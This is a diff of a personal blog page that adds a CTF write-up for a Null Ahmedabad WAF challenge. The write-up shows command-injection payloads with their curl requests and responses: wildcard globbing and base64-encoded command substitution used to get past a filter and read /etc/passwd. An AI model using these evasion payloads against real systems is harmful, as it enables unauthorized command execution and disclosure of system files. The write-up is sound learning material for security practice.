@@ -4,7 +4,7 @@
     <meta charset='utf-8'>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" href="/assets/css/style.css?v=3cf5d54b732d6213350422d18f10f2ccced0df33">
+    <link rel="stylesheet" href="/assets/css/style.css?v=608e4123b24a1c67fb738164fd577d8b23f862b8">
 
 <!-- Begin Jekyll SEO tag v2.6.1 -->
 <title>Null Ahmedabad WAF Writeup | Parth’s Blog</title>
@@ -17,7 +17,7 @@
 <meta property="og:url" content="http://localhost:4000/content/blog1.html" />
 <meta property="og:site_name" content="Parth’s Blog" />
 <script type="application/ld+json">
-{"@type":"WebPage","url":"http://localhost:4000/content/blog1.html","headline":"Null Ahmedabad WAF Writeup","description":"Posting my learning.","@context":"https://schema.org"}</script>
+{"@type":"WebPage","url":"http://localhost:4000/content/blog1.html","description":"Posting my learning.","headline":"Null Ahmedabad WAF Writeup","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
   </head>
@@ -61,11 +61,135 @@ It is always a great experience with NullAhm.There was a wonderful CTF challenge
 <img src="https://raw.githubusercontent.com/Auror007/Auror007.github.io/master/rawimg/b1mainpage.png" alt="Branching" /></p>
 
 <p><br />
+Cool Banner :)
+<br />
 The line at the end says:
 <br />
-<code class="language-plaintext highlighter-rouge">Your aim is to get the contents of /etc/passwd using “cat” command only. Check /rce.php?cmd= and /rce1.php?cmd= but code for 1st challenge is available and can be easily solved!</code></p>
+<code class="language-plaintext highlighter-rouge">Your aim is to get the contents of /etc/passwd using “cat” command only. Check /rce.php?cmd= and /rce1.php?cmd= but code for 1st challenge is available and can be easily solved!</code>
+<br /></p>
+<h2 id="rce1php">rce1.php</h2>
+<p>Now lets try to do what it says with curl.
+<br /></p>
+<h4 id="request">Request:</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://35.215.137.8/rce.php?cmd<span class="o">=</span>
+</code></pre></div></div>
+<h4 id="response">Response:</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Print /etc/passwd contents via <span class="nb">cat command </span>only!
+</code></pre></div></div>
+<p>I tried to append “cat /etc/passwd” in the url.Didn’t work. 
+I tried to download that file using wget but it only contained the above response in written in that file :(</p>
+
+<p>Lets try other things that were pointed by the hint given in Twitter Page of @NullAhm.It said that rce.php can be solved by the @Menin_TheMiddle articles.I had <del>read</del> skimmed through them. Now it was time to read it.This article focuses on wildcards also known as globbing patterns($man 7 glob).</p>
+
+<p><a href="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8">https://medium.com/secjuice/waf-evasion-techniques-718026d693d8</a></p>
+
+<h4 id="wildcard-table">Wildcard Table</h4>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Pattern</th>
+      <th style="text-align: left">Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">*</td>
+      <td style="text-align: left">Match zero or more characters</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">?</td>
+      <td style="text-align: left">Match any single character</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">[…]</td>
+      <td style="text-align: left">Match any of the characters in a set</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">?(patterns)</td>
+      <td style="text-align: left">Match zero or one occurrences of the patterns (extglob)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">*(patterns)</td>
+      <td style="text-align: left">Match zero or more occurrences of the patterns (extglob)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">+(patterns)</td>
+      <td style="text-align: left">Match one or more occurrences of the patterns (extglob)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">@(patterns)</td>
+      <td style="text-align: left">Match one occurrence of the patterns (extglob)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">!(patterns)</td>
+      <td style="text-align: left">Match anything that doesn’t match one of the patterns (extglob)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><br />
+<br />
+Lets try wilcards.Some WAF may not filter such wildcards.
+So, my payload was /bi?/ca?+/et?/passw? 
+<br /></p>
+<h4 id="request-1">Request:</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://35.215.137.8/rce.php?cmd<span class="o">=</span>/bi?/ca?+/et?/passw?
+</code></pre></div></div>
+<h4 id="response-1">Response:</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Print /etc/passwd contents via <span class="nb">cat command </span>only!
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+...
+</code></pre></div></div>
+<p>Success! Now rce1.php won’t be as easy as this.</p>
 
 <p><br /></p>
+<h4 id="request-2">Request:</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://35.215.137.8/rce1.php?cmd<span class="o">=</span>/bi?/ca?+/et?/passw?
+</code></pre></div></div>
+<h4 id="response-2">Response:</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Noice..
+Now print /etc/passwd contents via <span class="nb">cat command </span>only!
+&lt;br&gt;/biopps?/caoops ?+/etoops ?/passwopps?&lt;/br&gt;
+
+</code></pre></div></div>
+<p>After fuzzing various inputs, I realized that it is replacing the characters in the original command.I felt this as a dead end.But, there was a funny thought in my mind that made me do one more thing before giving up.It wasn’t restricting normal alphabetic characters.So the first though came into my mind was base64 encoding.Hence, I entered following command in my terminal.</p>
+
+<p><br /></p>
+<h4 id="terminal">Terminal:</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$echo</span> <span class="s2">"cat /etc/passwd"</span> | <span class="nb">base64</span> -      <span class="c"># '-' takes input file as output of previous echo. Same as $1.</span>
+<span class="nv">Y2F0IC9ldGMvcGFzc3dkCg</span><span class="o">==</span>
+<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"Y2F0IC9ldGMvcGFzc3dkCg=="</span> | <span class="nb">base64</span> <span class="nt">-d</span>  <span class="c">#-d for decode</span>
+<span class="nb">cat</span> /etc/passwd                         <span class="c">#yay! It outputs our payload command.</span>
+<span class="nv">$ </span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"Y2F0IC9ldGMvcGFzc3dkCg=="</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="si">)</span>  <span class="c">#Instead of printing this will execute the above output.</span>
+</code></pre></div></div>
+<p><br />
+Lets inject this in the rce1.php.
+<br /></p>
+<h4 id="request-3">Request:</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="s1">'http://35.215.137.8/rce1.php?cmd=$(echo+Y2F0IC9ldGMvcGFzc3dkCg==+|+base64+-d+-)'</span>
+</code></pre></div></div>
+<h4 id="response-3">Response:</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Print /etc/passwd contents via <span class="nb">cat command </span>only!&lt;br&gt;<span class="si">$(</span><span class="nb">echo </span><span class="nv">Y2F0IC9ldGMvcGFzc3dkCg</span><span class="o">==</span> oops | <span class="nb">base64</span> <span class="nt">-d</span> -<span class="si">)</span>
+&lt;br&gt;root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+...
+</code></pre></div></div>
+<p>Success! Never thought this would ever work, but it did.I wanted to see where I got lucky.
+$(echo Y2F0IC9ldGMvcGFzc3dkCg== oops | base64 -d -). Here all the + signs are converted to spaces as this string is parsed. And then base64 decoding uses blocks of 3 charcters to decode. It uses = or == as padding if one or two characters are remaining respectively to complete the count of 3.As the command decodes the string it does not care about the string “oops”.Ctrl + x.Go to sleep.
+<br />
+Thank You for reading my first blog.</p>
 
 
       </section>
